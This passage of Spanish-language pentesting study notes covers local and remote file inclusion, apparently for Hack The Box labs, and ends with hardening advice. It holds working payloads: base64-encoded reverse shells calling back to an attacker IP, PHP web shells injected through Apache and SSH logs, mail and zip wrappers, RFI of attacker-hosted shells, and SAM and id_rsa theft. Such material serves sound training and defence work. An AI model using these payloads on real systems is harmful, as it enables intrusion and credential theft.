echo "bash -c 'bash -i >& /dev/tcp/<IP KALI>/8080 0>&1'" | base64; echo

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP KALI> 1234 >/tmp/f" | base64; echo
```

copiar el resultado y mandar con PHP de la siguiente manera:

```bash
<?php system("echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgPElQIEtBTEk+IDEyMzQgPi90bXAvZg== | base64 -d | bash"); ?>
```

al final quedaria asi:

```bash
curl -s -H "User-Agent: <?php system("echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgPElQIEtBTEk+IDEyMzQgPi90bXAvZg== | base64 -d | bash"); ?>" "http://127.0.0.1/example.php?file=/var/log/apache2/access.log"
```

#### SSH LOGS

En caso de visualizar el archivo **/var/log/auth.log** es ahi donde se registra los logs de autenticacion de SSH, (se tiene que tener SSH en el equipo para esta prueba), como ahi se registra el nombre se usuario que quiere ingresar y ya sea exitoso o no el logeo igual se registra si que podemos hacer lo siguiente:

```bash
ssh '<?php system($_GET['c']); ?>'@192.168.1.129
```

ahora al ver ese archivo le pasamos la variable **c** para la ejecucion remota.

```bash
192.168.1.129/lfi/lfi.php?file=/var/log/auth.log&c=ifconfig
```


Otras posibles rutas de logs son.

```bash
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
http://example.com/index.php?page=/var/log/vsftpd.log
http://example.com/index.php?page=/var/log/sshd.log
http://example.com/index.php?page=/var/log/mail
http://example.com/index.php?page=/usr/local/apache/log/error_log
http://example.com/index.php?page=/usr/local/apache2/log/error_log
```

** NOTA:**

**Tenga en cuenta que si utiliza comillas dobles para el shell en lugar de comillas simples , las comillas dobles se modificarán para la cadena " quote; ", PHP arrojará un error allí y no se ejecutará nada más** .

---------------------------------------------------------------------

En el caso de tener acceso al **/var/log/auth.log** y verlo desde el navegardor se puede ver el contenido de inicio de sesion de ssh (usuario de logueo exitosos o fallidos).

Entonces si esto lo podemos ver desde el navegador podemos, al conectarnos por ssh, en lugar de poder el usuario colocar un codigo malicioso en php.

```bash
ssh '<?php system('whoami'); ?>'@10.10.10.12

# 10.10.10.12 es la maquina donde tiene ese archivo log
```

ponemos cualquier contraseña (de todos modos ira al archivo log) y al recargar el archivo de logs desde el navegador vemos que se ejecuta comandos.

Con base64:

```bash
ssh '<?php system("echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgPElQIEtBTEk+IDEyMzQgPi90bXAvZg== | base64 -d | bash"); ?>'@10.10.10.12
```

### Via /proc/*/fd/*

Esto en caso de poder cargar archivos:

1.    Sube muchos shells (por ejemplo: 100)
    
2.   Incluya [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD) , con $ PID = PID del proceso (puede ser forzado en este caso un valos del 1-100 como minimo) y $ FD el descriptor del archivo (puede ser forzado también)

#### /proc/self/fd ó /dev/fd/

Dentro de los directorios ya sea /proc/self/fd/ o /dev/fd/ podemos encontrar ciertos archivos con la siguiente estructura:

-   /proc/self/fd/x
-   /dev/fd/x

Siendo x un número.

Estos archivos están directamente relacionados con algunos procesos y registros del sistema. Por lo que quizás, uno de estos archivos puede que nos muestre información del servidor web al que estamos accediendo, y, con ello, algún campo que sea editable por nosotros.

maquina backdoor HTB,

ejemplo real:

[https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899](https://infosecwriteups.com/bugbounty-journey-from-lfi-to-rce-how-a69afe5a0899)


### Via /proc/self/environ

Al igual que en los logs de apache en este archivo se refleja el User-Agent:

```bash
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?php system('whoami'); ?>
```

### Via carga de archivo ZIP

Cargue un archivo ZIP que contenga un shell PHP comprimido y acceda a:

```bash
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```

```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;  
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php
```

```bash
apt install phpX.Y-zip
echo '<?php system($_GET['cmd']); ?>' > exec.php
zip malicious.zip exec.php
rm exec.php

http://134.209.184.216:30489/index.php?language=zip://malicious.zip%23exec.php&cmd=id
```

`#` está codificado para `%23` evitar que el navegador lo reconozca como un fragmento.

### Mail PHP Execution

consiste en aprovechar la vulnerabilidad LFI para tras visualizar los usuarios en el recurso '**/etc/passwd**', poder visualizar sus correspondientes mails en '**/var/mail/usuario**'.

Es decir, suponiendo que tenemos nociones de que existe un usuario '**www-data**' sobre el sistema, en caso de contar con el servicio **smtp** corriendo, podemos "malformar" un mensaje para insertar código PHP y posteriormente apuntarlo desde el navegador.

En caso de no llegar a saber qué usuarios hay en el sistema, podemos hacer uso de la herramienta **smtp-user-enum** para enumerar usuarios sobre el servicio:

```bash
smtp-user-enum -M VRFY -U top_shortlist.txt -t 192.168.1.X
```

Obteniendo resultados similares al siguiente:

```bash
192.168.1.X: root exists
192.168.1.X: mysql exists
192.168.1.X: www-data exists
```

Ahora que sabemos que el usuario **www-data** existe, podemos hacer lo siguiente:

```bash
telnet 192.168.1.X 25

HELO localhost

MAIL FROM:<root>

RCPT TO:<www-data>

DATA

<?php

echo shell_exec($_REQUEST['cmd']);
?>
```

teniendo en cuenta que el mail ha sido enviado, tan sólo tendremos que hacer lo siguiente:

```bash
http://192.168.1.X/?page=../../../../../var/mail/www-data?cmd=comando-a-ejecutar
```

Y el navegador nos devolverá el output del comando aplicado a nivel de sistema.


### Via credentials file

La cosa es tener permisos de lectura en la SAM o SYSTEM en windows:

```bash
http://example.com/index.php?page=../../../../../../WINDOWS/repair/sam
http://example.com/index.php?page=../../../../../../WINDOWS/repair/system
```

Lo dumpeamos con:

```bash
pwdump SAM SYSTEM

o

samdump2 SAM SYSTEM > hashes.txt
```

Y podemos realizar un Pass-The-Hash.

### Via phpinfo

Para aprovechar esta vulnerabilidad, necesita: **Una vulnerabilidad LFI, una página donde se muestra phpinfo (), "file_uploads = on" y el servidor debe poder escribir en el directorio "/ tmp".**

[https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py](https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/File%20Inclusion/phpinfolfi.py)

Necesitas arreglar el exploit (cambiar **=>** por **&gt** ). Para hacerlo, puede hacer:

```bash
sed -i 's/\[tmp_name\] \=>/\[tmp_name\] =\&gt/g' phpinfolfi.py
```

Debe cambiar también la **carga útil** al comienzo del exploit (para un php-rev-shell, por ejemplo), el **REQ1** (esto debe apuntar a la página phpinfo y debe tener el relleno incluido, es decir: _REQ1 = "" "POST /install.php?mode=phpinfo&a="""+padding+ "" "HTTP / 1.1 \ r_ ) y **LFIREQ** (esto debería apuntar a la vulnerabilidad LFI, es decir: _LFIREQ =" "" GET / info? page =% s \%% 00 HTTP / 1.1 \\ r -_ Marque el doble "%" al explotar el carácter nulo)

[LFI con PHPInfo](https://firebasestorage.googleapis.com/v0/b/gitbook-28427.appspot.com/o/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-L_Y6hln3AC5TfzCrKez%2F-L_Y7wJD9oBPwzbpKXce%2FLFI-With-PHPInfo-Assistance.pdf?alt=media&token=b0f544ea-2fe7-4b3f-9177-6ed5ece6d277)

[HTB poison Ippsec](https://www.youtube.com/watch?v=rs4zEwONzzk&t=600s)

### Via el servicio de SSH

Si ssh está activo, verifique qué usuario se está utilizando (/proc/self/status o /etc/ passwd) e intente acceder a /home/\<usuario\>/.ssh/id_rsa
	
Asi podemos robarles la id_rsa e intentar loguearse con esa identidad

## AUTOMATED SCANNING

### FUZZING PARAMETROS

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```

![[Pasted image 20230125234828.png]]

Una vez que identificamos un parámetro expuesto que no está vinculado a ninguno de los formularios que probamos, podemos realizar todas las pruebas LFI.

>[!tip]
>Para tener un resultado mas preciso podemos usar este diccionario: [https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters)

### FUZZING LFI PAYLOADS

**_Ya una vez identificado un parametro, continuamos con esto._**

Podemos usar uno de los siguientes diccionarios:

- [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
- [https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)

```bash
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```

![[Pasted image 20230125234848.png]]

### Fuzzing de archivos del servidor

Podemos usar los siguientes diccionarios de directorios conocidos:

 - [lista de palabras para Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt)
 - [lista de palabras para Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt) 

Dependiendo de nuestra situación de LFI, es posible que necesitemos agregar algunos directorios posteriores (por ejemplo `../../../../`, ) y luego agregar nuestros epílogos `index.php`.

```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
```

![[Pasted image 20230125234907.png]]

>[!tip]
>También podemos usar la misma lista de palabras [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) que usamos anteriormente, ya que también contiene varias cargas útiles que pueden revelar la raíz web.

 Si queremos un análisis más preciso, podemos usar estas listas que continen archivos de configuracion y logs:
 - [lista de palabras para Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) 
 - [lista de palabras para Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
 - [https://github.com/DragonJAR/Security-Wordlist](https://github.com/DragonJAR/Security-Wordlist)

```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```

![[Pasted image 20230125234925.png]]

### OTHER TOOLS

- [https://github.com/D35m0nd142/LFISuite](https://github.com/D35m0nd142/LFISuite)
- [https://github.com/OsandaMalith/LFiFreak](https://github.com/OsandaMalith/LFiFreak)
- [https://github.com/mzfr/liffy](https://github.com/mzfr/liffy)

# CHEATSHEET HACK THE BOX

| **Command** | **Description** |
| --------------|-------------------|
| `php://filter/read=convert.base64-encode/resource=/etc/passwd` | PHP filter to convert file contents to Base64 |
| `php://filter/read=string.rot13/resource=/etc/passwd`   | PHP filter to convert file contents to ROT13 |
| `expect://id` | Command execution with PHP `Expect` wrapper |
| `curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input"` | Using PHP `Input` wrapper for command execution |
| `zip://malicious.zip%23exec.php&cmd=id` | Command execution with the PHP `Zip` wrapper |
| `<?php system($_GET['cmd']); ?>` | PHP web shell file contents (i.e., shell.php) |

[https://zsahi.wordpress.com/2018/09/10/file-inclusion/](https://zsahi.wordpress.com/2018/09/10/file-inclusion/)

# REMOTE FILE INCLUSION

**LFI:** (Local File Inclusion) podemos ver archivos del mismo servidor local.

**RFI:** (Remote File Inclusion) podemos ver archivos de un servidor remoto.

Casi cualquier inclusión de archivo remoto (RFI) también puede ser una inclusión de archivo local (LFI); sin embargo, cualquier LFI puede no ser una RFI. Esto se debe principalmente a dos razones:

-   Sólo se puede controlar una parte del nombre de archivo y no toda la envoltura de protocolo (ex: `http://`, `ftp://`, `https://`)
-   La configuración puede evitar la RFI por completo. Por ejemplo, en PHP, al establecer `allow_url_include`en `0`, no será posible utilizar fuentes remotas dentro de la `include()`declaración.

Para incluir un archivo remoto en PHP, la configuración `allow_url_fopen` (habilitada de forma predeterminada) y la configuración `allow_url_include` deben estar activadas.

Entonces yo puedo usar la PHP reverse shell de Monkey Pentester:

[pentestmonkey php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)

Creamos un servidor con python por ejemplo:

```bash
python -m SimpleHTTPServer 8080
```

Y llamamos desde la pagina de la maquina victima a un archivo remoto (RFI) que etsa en nuestro equipo a traves del servidor en python:

```bash
http://localhost/file.php?file=http://<IP KAIL>:8080/shell.php
```

O puede hacer:

```bash
echo "<?php system($_GET['cmd']); ?>" > shell.php

http://localhost/file.php?file=http://<IP KAIL>:8080/shell.php&cmd=whoami
```

Se puede hacer mediante FTP:

```bash
pip install pyftpdlib

python -m pyftpdlib -p 21

http://localhost/file.php?file=ftp://<IP KAIL>:8080/shell.php&cmd=whoami
```

De forma predeterminada, PHP intenta autenticarse como un usuario anónimo. Si el servidor necesita autenticación, las credenciales se pueden especificar de la siguiente manera:

```bash
http://blog.inlanefreight.com/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
```

## RFI WINDOWS

Cuando la aplicación se ejecuta en Windows, las restricciones aplicadas por `allow_url_include` se pueden omitir mediante el protocolo SMB. Esto se debe a que Windows trata los archivos de los servidores SMB remotos como archivos normales, a los que se puede hacer referencia directamente con una ruta UNC. Podemos activar un servidor SMB utilizando smbserver.py de Impacket, que permite la autenticación anónima de forma predeterminada.

```bash
smbserver.py -smb2support smbfolder $(pwd)


http://blog.inlanefreight.com/index.php?language=\\<IP KALI>\smbfolder\shell.php&cmd=id
```

## BYPASS FILTROS

Todos los filtros de LFI son aplicables a RFI.

# HARDENING

Si los atacantes pueden controlar el directorio, pueden escapar de la aplicación web y atacar algo con lo que están más familiarizados o usar un `universal attack chain` . Por ejemplo, podrían:

-   Leer `/etc/passwd` y potencialmente encontrar claves SSH o conocer nombres de usuario válidos para un ataque de rociado de contraseñas
    
-   Busque otros servicios en el cuadro, como Tomcat, y lea el archivo tomcat-users.xml
    
-   Descubra cookies de sesión PHP válidas y realice el secuestro de sesiones
    
-   Lea la configuración actual de la aplicación web y obtenga acceso al secreto utilizado para proteger las cookies. En algunos marcos, esta cookie no se serializa de una manera insegura, y solo leer la configuración puede llevar a la ejecución remota de código.
    

La mejor manera de evitar el cruce de directorios es usar la herramienta incorporada de su lenguaje de programación (o marco) para extraer solo el nombre del archivo. Por ejemplo, PHP tiene `basename()` que leerá la ruta y solo devolverá la parte del nombre del archivo. Si solo se proporciona un nombre de archivo, devolverá solo el nombre de archivo. Si solo se proporciona la ruta, tratará lo que esté después de la / final como el nombre del archivo. La desventaja de este método es que si la aplicación necesita ingresar a algún directorio, no podrá hacerlo.

Si quieres jugar con esto, ingresa el intérprete de PHP con `php -a` y luego ejecuta comandos como `echo basename("/etc/passwd");`. ¡Asegúrese de poner el punto y coma al final!

## COMPROBACIONES

Un vector de ataque común de LFI ocurre cuando las aplicaciones comprueban incorrectamente si hay elementos maliciosos. El más común es usar en `deny lists` lugar de `allow lists`. Un gran ejemplo de esto son los formularios de carga donde la `PHP` extensión se bloquea para que no se cargue , sin darse cuenta de que existen otras extensiones que tienen la misma funcionalidad (php1, php2, php3, etc.). Si se utilizó una lista de permitidos solo para permitir el acceso a jpeg, gif y png, el ataque podría haberse evitado por completo.

Al validar extensiones, asegúrese de que la aplicación utilice las herramientas integradas de los lenguajes de programación para extraer la extensión antes de comparar. Si las herramientas integradas no son suficientes por alguna razón, utilice expresiones regulares y asegúrese de colocar el `end of line terminator ($)` al final de la entrada del usuario. Si no se realiza ninguna de estas acciones, es probable que la aplicación busque una extensión aprobada en el nombre del archivo, que puede que no sea realmente la extensión (por ejemplo:) `file.php.jpg`.

Intente utilizar las herramientas dentro de su lenguaje / marco antes de encontrar sus propias soluciones. Las funciones de los marcos tienden a ser seguras de forma predeterminada, mientras que el uso de funciones aleatorias integradas en el lenguaje puede tener casos de uso inseguros. Por ejemplo, se puede configurar la función PHP Regular Expression que permite la ejecución de código (HackTheBox SwagShop lo demuestra).

## HARDENING

A menudo es posible configurar el entorno del servidor web para evitar que se ejecuten códigos maliciosos en primer lugar. A menudo hay formas de evitar el endurecimiento de las aplicaciones, ya que evita comportamientos que los atacantes pueden evitar. Sin embargo, los atacantes generarán mensajes de error al intentar sortear el endurecimiento de la aplicación, lo que otorga a los defensores tiempo para reaccionar ante una vulnerabilidad. Por ejemplo, si la `system()` función está bloqueada, se creará un registro sobre la funcionalidad bloqueada que se usa cuando un atacante la usa. Con suerte, este es un evento poco común y, si se envían correos electrónicos, el defensor puede reaccionar antes de que el atacante descubra por qué se bloqueó el evento. Es por eso que las aplicaciones web deberían `never display error messages to the website`; si el atacante puede ver por qué falló su ataque, será trivial evitarlo. Para deshabilitar esto en PHP, edite el`php.ini` archivo y verificación: `display_errors = Off` está configurado.

Para bloquear `system()` en PHP, agregue las funciones que desea bloquear a las líneas "disabled_functions" de PHP. Una lista de funciones recomendadas para bloquear es: `system, passthru, shell_exec, popen, proc_open, curl_exec, curl_multi_exec, parse_ini_file, show_source`

Es bastante raro que las aplicaciones web carguen archivos desde ubicaciones remotas, por lo que se recomienda que esta funcionalidad también se desactive. En PHP, esto se puede hacer configurando `allow_url_fopen` y `allow_url_include` en Off.

También es posible encarcelar aplicaciones web, evitando que accedan a archivos no relacionados con la web. La forma más común de hacer esto en la era actual es ejecutar la aplicación dentro `Docker`. Sin embargo, si esa no es una opción, muchos idiomas a menudo tienen una forma de evitar el acceso a archivos fuera del directorio web. En PHP, eso se puede hacer agregando `open_basedir = /var/www` el archivo php.ini

## WAF

La forma universal de fortalecer las aplicaciones es utilizar un WAF (Web Application Firewall) como `ModSecurity`. Si usa [ModSecurity](https://www.modsecurity.org/) , se recomienda usar también el [Conjunto de reglas básicas](https://owasp.org/www-project-modsecurity-core-rule-set/) . Cuando se trata de WAF, lo más importante a evitar son los falsos positivos y el bloqueo de solicitudes no maliciosas. ModSecurity minimiza los falsos positivos al ofrecer un `permissive`, que solo informará las cosas que habría bloqueado. Esto permite a los defensores ajustar las reglas para asegurarse de que no se bloquee ninguna solicitud legítima. Incluso si la organización nunca quiere cambiar el WAF al "modo de bloqueo", tenerlo en modo permisivo puede ser una señal de advertencia temprana de que su aplicación está siendo atacada.

En segundo lugar, ModSecurity se basa en la reputación, lo que significa que a cada activador se le asigna un valor de punto, y la solicitud solo se bloquea al llegar a cierto punto. Imagine que el sistema bloquea cualquier solicitud de 3 o más puntos, y una cadena que aparece en la lista de denegación tiene solo 2 puntos. Entonces, `../../etc/passwd` solo no se bloquearía ya `../../` que solo daría como resultado 2 puntos. Sin embargo, si la solicitud provenía de Amazon AWS, Tor, proveedor de VPN, etc., se agregaría otro punto y la solicitud se bloquearía.